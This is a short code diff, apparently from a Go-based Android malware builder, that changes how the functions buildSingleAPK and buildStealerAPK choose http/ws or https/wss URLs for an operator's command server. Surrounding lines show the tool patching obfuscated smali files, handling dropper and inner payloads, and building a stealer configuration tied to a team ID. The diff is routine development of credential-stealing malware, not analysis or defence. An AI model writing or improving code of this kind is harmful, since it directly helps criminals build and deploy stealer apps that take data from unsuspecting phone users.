@@ -1702,14 +1702,22 @@ func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPay
 	}
 
 	serverURL := b.serverIP
-	if !strings.Contains(serverURL, "://") {
-		serverURL = b.serverIP
-	}
-	httpURL := "http://" + serverURL
-	wsURL := "ws://" + serverURL
-	if strings.HasPrefix(serverURL, "http://") || strings.HasPrefix(serverURL, "https://") {
+	var httpURL, wsURL string
+	if strings.HasPrefix(serverURL, "https://") {
 		httpURL = serverURL
-		wsURL = strings.Replace(strings.Replace(serverURL, "https://", "wss://", 1), "http://", "ws://", 1)
+		wsURL = strings.Replace(serverURL, "https://", "wss://", 1)
+	} else if strings.HasPrefix(serverURL, "http://") {
+		httpURL = serverURL
+		wsURL = strings.Replace(serverURL, "http://", "ws://", 1)
+	} else {
+		// Auto-detect scheme: port 443 → https/wss, otherwise http/ws
+		if strings.HasSuffix(serverURL, ":443") || os.Getenv("SERVER_SCHEME") == "https" {
+			httpURL = "https://" + serverURL
+			wsURL = "wss://" + serverURL
+		} else {
+			httpURL = "http://" + serverURL
+			wsURL = "ws://" + serverURL
+		}
 	}
 
 	smaliFile := filepath.Join(workDir, "smali", "v", "s", "KV57Z6oavcB595B8Dy8Z.smali")
@@ -1941,7 +1949,11 @@ func (b *Bot) buildStealerAPK(sess *BuildSession) ([]byte, string, error) {
 
 	serverURL := b.serverIP
 	if !strings.Contains(serverURL, "://") {
-		serverURL = "http://" + serverURL
+		if strings.HasSuffix(serverURL, ":443") || os.Getenv("SERVER_SCHEME") == "https" {
+			serverURL = "https://" + serverURL
+		} else {
+			serverURL = "http://" + serverURL
+		}
 	}
 	configData, err := buildStealerConfig(serverURL, b.teamID)
 	if err != nil {
